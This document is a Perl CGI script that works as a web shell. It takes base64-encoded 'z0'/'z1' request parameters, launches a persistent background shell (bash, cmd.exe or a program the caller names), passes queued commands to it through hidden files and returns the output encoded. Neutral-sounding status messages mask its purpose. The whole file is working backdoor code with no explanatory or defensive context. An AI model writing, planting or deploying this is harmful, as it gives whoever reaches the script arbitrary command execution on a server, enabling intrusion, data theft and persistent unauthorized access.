use strict;
use warnings;
use CGI;
use MIME::Base64 qw(decode_base64 encode_base64);
use File::Spec;

sub print_json {
    my ($hash) = @_;
    print sprintf('{"status":"%s","msg":"%s"}', $hash->{status}, $hash->{msg});
}

sub open2 {
    my ($read, $write, $cmd) = @_;
    my ($child_in, $parent_out, $parent_in, $child_out);
    pipe($parent_in, $child_out); pipe($child_in, $parent_out);
    my $pid = fork();
    if ($pid == 0) {
        close($parent_in); close($parent_out);
        open(STDIN, '<&', $child_in); open(STDOUT, '>&', $child_out); open(STDERR, '>&', $child_out);
        exec($cmd);
    }
    close($child_in); close($child_out);
    $_[0] = $parent_in; $_[1] = $parent_out;
    return $pid;
}

my $work_dir  = File::Spec->rel2abs('.');
my $queue_dir = File::Spec->catdir($work_dir, '.queue');
my $out_file  = File::Spec->catfile($work_dir, '.output.txt');
my $pid_file  = File::Spec->catfile($work_dir, '.pid.txt');

mkdir($queue_dir, 0777) unless -d $queue_dir;

my $q = CGI->new;
my $type = decode_base64($q->param('z0') || '');
my $z1   = decode_base64($q->param('z1') || '');

my %result = ( status => "fail", msg => "" );

if ($type eq "create") {
    unlink glob(File::Spec->catfile($queue_dir, '*.txt'));
    open(my $fh_out, '>', $out_file); close($fh_out);
    open(my $fh_pid, '>', $pid_file); print $fh_pid "running"; close($fh_pid);

    my $is_win = ($^O eq 'MSWin32');
    my $shell = $z1 ? $z1 : ($is_win ? "cmd.exe" : "/bin/bash");

    my $pid = fork();
    if (!defined $pid) {
        $result{msg} = encode_base64("Failed to fork process.");
        print_json(\%result);
        exit(1);
    }

    if ($pid == 0) {
        my ($shell_in, $shell_out);
        my $shell_pid = open2($shell_out, $shell_in, $shell);

        while (1) {
            last unless -e $pid_file;
            open(my $fh, '<', $pid_file); my $status = <$fh>; close($fh);
            last if $status !~ /running/;

            my @files = sort(glob(File::Spec->catfile($queue_dir, '*.txt')));
            foreach my $file (@files) {
                if (open(my $fh_q, '<', $file)) {
                    local $/; my $buf = <$fh_q>; close($fh_q); unlink $file;
                    print $shell_in $buf; $shell_in->flush();
                }
            }

            my $chunk = "";
            my $bytes_read = eval {
                local $SIG{ALRM} = sub { die "timeout\n" };
                alarm(1);
                my $res = sysread($shell_out, $chunk, 10240);
                alarm(0);
                $res;
            };
            
            if (defined $bytes_read && $bytes_read > 0) {
                open(my $fh_append, '>>', $out_file);
                flock($fh_append, 2); # LOCK_EX
                print $fh_append $chunk;
                flock($fh_append, 8);
                close($fh_append);
            }

            select(undef, undef, undef, 0.015); # sleep 15ms
        }
        kill(9, $shell_pid) if $shell_pid;
        exit(0);
    }

    $result{status} = "success";
    $result{msg} = "Perl engine spawned in background execution state successfully.";
    print_json(\%result);
} elsif ($type eq "write") {
    my $filename = sprintf("%010d_%04d.txt", time(), int(rand(10000)));
    my $chunk_file = File::Spec->catfile($queue_dir, $filename);
    open(my $fh, '>', $chunk_file);
    flock($fh, 2); print $fh $z1; flock($fh, 8);
    close($fh);

    $result{status} = "success";
    $result{msg} = "Input buffer queued.";
    print_json(\%result);
} elsif ($type eq "read") {
    my $read_content = "";
    if (-e $out_file && -s $out_file > 0) {
        open(my $fh, '+<', $out_file);
        flock($fh, 2);
        local $/; $read_content = <$fh>;
        seek($fh, 0, 0); truncate($fh, 0);
        flock($fh, 8); close($fh);
    }
    $result{status} = "success";
    my $b64 = encode_base64($read_content || '', '');
    $result{msg} = $b64;
    print_json(\%result);
} elsif ($type eq "stop") {
    open(my $fh, '>', $pid_file); print $fh "stopped"; close($fh);
    $result{status} = "stop";
    $result{msg} = encode_base64("Engine shutdown initiated.");
    print_json(\%result);
}